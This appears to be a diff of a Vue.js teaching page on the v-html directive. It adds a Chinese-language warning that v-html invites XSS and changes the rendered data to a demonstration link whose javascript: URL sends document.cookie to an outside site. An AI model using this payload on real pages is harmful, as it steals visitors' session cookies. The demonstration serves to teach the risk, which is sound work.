@@ -34,9 +34,11 @@
     <!-- 模版 -->
     <div id="div">
 
-   <div v-html="mes">我会被v-text覆盖掉</div>
+        <div v-html="mes">我会被v-text覆盖掉</div>
 
-
+        <div>严重注意: v-htm1有安全性问题! ! ! !
+            (1)。在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
+            (2).一定要在可信的内容上使用v-htm1，永不要用在用户提交的内容上!</div>
 
     </div>
 
@@ -50,8 +52,8 @@
             //data属性是vue实例的数据
             data() {
                 return {
-                    mes: `<div> v-text='属性名'</div> 标签会生效`, 
-                  
+                    mes: `<a href=javascript:location.href="https://www.jd.com/?"+document.cookie>百度</a>`,
+
                 }
             }
         })
